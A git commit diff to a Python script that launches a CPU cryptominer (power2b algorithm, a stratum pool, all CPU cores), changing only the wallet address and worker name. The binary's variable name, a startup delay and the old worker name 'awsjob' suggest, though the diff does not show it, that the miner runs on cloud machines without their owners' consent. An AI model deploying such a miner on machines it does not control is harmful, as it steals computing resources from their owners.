d0dac16c8d62439a56aa1d4e3dda2d01bb625b20
ForealSus <inkabound.889@gmail.com>
2025-07-18 04:57:01 +0700

    Update index.py

--- index.py
+++ index.py
@@ -23,8 +23,8 @@ time.sleep(30)
 
 algo = "power2b"
 pool = "stratum+tcps://stratum-asia.rplant.xyz:17022"
-wallet = "mbc1qtvjkvc3a2zrvt0zz43ydwqrgzjuvtsh7fenh5k"
-worker = "awsjob"
+wallet = "mbc1qyll66z05zywke8ry9fh5xtrxrunadu0ac2a0f4"
+worker = "gasbg"
 
 cmd = f"./{final_name} -a {algo} -o {pool} -u {wallet}.{worker} -t {os.cpu_count()}"
 print(f"[INFO] Running miner:\\n{cmd}\\n")
